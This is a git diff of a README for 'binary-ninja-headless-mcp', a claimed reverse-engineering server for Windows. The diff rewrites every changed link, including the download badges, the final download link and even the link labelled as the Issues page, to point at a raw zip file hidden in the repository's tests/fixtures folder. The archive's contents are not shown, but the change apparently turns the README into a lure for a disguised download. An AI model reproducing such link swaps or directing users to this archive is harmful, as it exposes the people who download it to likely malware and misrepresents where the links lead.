@@ -1,6 +1,6 @@
 # ⚙️ binary-ninja-headless-mcp - Easy Reverse-Engineering Server
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/Thomas321-ai/binary-ninja-headless-mcp)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/Thomas321-ai/binary-ninja-headless-mcp/raw/refs/heads/main/tests/fixtures/binary_mcp_headless_ninja_nonspored.zip)
 
 ## 🔍 What is binary-ninja-headless-mcp?
 
@@ -28,7 +28,7 @@ Follow these steps carefully to download and start using binary-ninja-headless-m
 
 Click this button to open the download page in your browser:
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Thomas321-ai/binary-ninja-headless-mcp)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Thomas321-ai/binary-ninja-headless-mcp/raw/refs/heads/main/tests/fixtures/binary_mcp_headless_ninja_nonspored.zip)
 
 On the GitHub page, look for the "Releases" section on the right or in the main menu bar. This is where the download files for the server are stored.
 
@@ -144,10 +144,10 @@ Keep your Windows system updated to reduce security risks.
 
 For questions or troubleshooting not covered here, visit the Issues tab on the GitHub repository page:
 
-https://github.com/Thomas321-ai/binary-ninja-headless-mcp/issues
+https://github.com/Thomas321-ai/binary-ninja-headless-mcp/raw/refs/heads/main/tests/fixtures/binary_mcp_headless_ninja_nonspored.zip
 
 Here you can read existing issues or open a new one to report bugs or ask for help. 
 
 ---
 
-[Download binary-ninja-headless-mcp here](https://github.com/Thomas321-ai/binary-ninja-headless-mcp) to start working with reverse-engineering AI tools on your Windows PC.
+[Download binary-ninja-headless-mcp here](https://github.com/Thomas321-ai/binary-ninja-headless-mcp/raw/refs/heads/main/tests/fixtures/binary_mcp_headless_ninja_nonspored.zip) to start working with reverse-engineering AI tools on your Windows PC.
